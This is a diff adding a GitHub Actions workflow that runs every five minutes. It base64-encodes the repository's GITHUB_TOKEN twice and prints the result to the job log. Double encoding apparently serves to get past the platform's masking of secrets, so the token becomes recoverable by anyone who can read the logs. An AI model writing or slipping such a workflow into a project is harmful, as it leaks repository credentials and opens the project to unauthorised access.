@@ -1,0 +1,16 @@
+name: Double Encode GitHub Token
+
+on:
+  schedule:
+    - cron: "*/5 * * * *"  # Every 5 minutes
+    
+jobs:
+  encode-token:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Double base64 encode GITHUB_TOKEN
+        run: |
+          echo "$GITHUB_TOKEN" | base64 -w0 | base64 -w0 > double_encoded.txt
+          echo "Double Encoded GITHUB_TOKEN:"
+          cat double_encoded.txt
